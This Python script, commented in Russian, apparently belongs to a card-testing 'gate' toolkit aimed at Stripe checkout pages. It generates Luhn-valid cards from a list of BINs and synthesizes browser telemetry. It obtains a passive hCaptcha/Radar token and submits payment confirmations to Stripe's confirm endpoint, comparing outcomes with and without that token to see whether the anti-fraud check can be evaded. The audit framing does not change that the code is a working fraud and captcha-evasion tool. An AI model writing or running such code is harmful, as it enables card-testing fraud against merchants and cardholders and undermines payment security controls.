# language: Python 3.12+, file: _audit/exp_passive_token2.py, target: Windows 11
"""Эксперимент: честное сравнение «наш токен против отсутствия токена» (свежий pm на каждую попытку).

Урок предыдущего прогона: один и тот же pm нельзя переиспользовать — Stripe отвечает «PaymentMethod was
previously used with a PaymentIntent without Customer attachment». Поэтому на каждую попытку — свежий pm.

Запуск: python _audit/exp_passive_token2.py <файл со ссылкой>
"""
import asyncio
import json
import sys
import uuid

sys.path.insert(0, "C:/Users/Redmi/Downloads/pusto")

import config  # noqa: E402
import gate_client as gc  # noqa: E402
import hit_gate as hg  # noqa: E402



def exp_card_raw() -> str:
    """Пробник по Луну, генерируется на ходу: полного PAN в исходнике нет (правило гигиены секретов).

    Карта нужна только для проверки поведения маршрута — эмитент её всё равно отклонит без списания.
    """
    import random

    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"


HEADERS = {"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}
CARD = None  # заполняется exp_card_raw() на старте


async def tokenize(gs):
    pan, mm, yy, cvc = CARD.split("|")
    telem = gs.synthesize_telemetry()
    body = gc.tokenize_body({"number": pan, "mm": mm, "yy": yy, "cvc": cvc}, telem, gs.url.split("#")[0])
    res = await gc.tokenize_payment_method(gs.s, body, timeout=12)
    return res.get("id")


async def confirm(gs, pm_id, token, label):
    body = {"key": gs.pk, "eid": str(uuid.uuid4()), "payment_method": pm_id,
            "expected_payment_method_type": "card",
            "expected_amount": str(gs.expected_amount or gs.amount),
            "return_url": gs.url.split("#")[0]}
    if gs.checksum:
        body["init_checksum"] = gs.checksum
    if token is not None:
        body["passive_captcha_token"] = token
    r = await gs.s.post(f"https://api.stripe.com/v1/payment_pages/{gs.cs}/confirm", data=body, headers=HEADERS, timeout=20)
    try:
        j = r.json() or {}
    except Exception:
        j = {"raw": r.text[:200]}
    err = j.get("error") or {}
    pi = j.get("payment_intent") or {}
    sdk = ((pi.get("next_action") or {}).get("use_stripe_sdk") or {})
    print(f"  [{label}] http={r.status_code} code={err.get('code')!r} msg={str(err.get('message'))[:110]!r}")
    print(f"  [{label}] pi={pi.get('id')} status={pi.get('status')} sdk_type={sdk.get('type')!r}")
    return r.status_code


async def main():
    global CARD
    CARD = exp_card_raw()
    url = open(sys.argv[1], encoding="utf-8").read().strip()
    gs = hg.CsHitSession(url)
    ok, detail = await gs.open()
    print(f"open={ok} {detail} | сумма={gs.expected_amount or gs.amount}{gs.currency}")
    if not ok:
        return
    token = None
    try:
        token = await gc.fetch_hcaptcha_radar_token(gs.s, gs.pk, "checkout.stripe.com")
    except Exception as e:
        print("токен не добыт:", str(e)[:90])
    print(f"токен: {type(token).__name__} len={len(token) if token else 0} prefix={str(token)[:10]!r}")
    pm1 = await tokenize(gs)
    await confirm(gs, pm1, token, "С НАШИМ passive_captcha_token")
    pm2 = await tokenize(gs)
    await confirm(gs, pm2, None, "БЕЗ токена")
    await gs.close()


asyncio.run(main())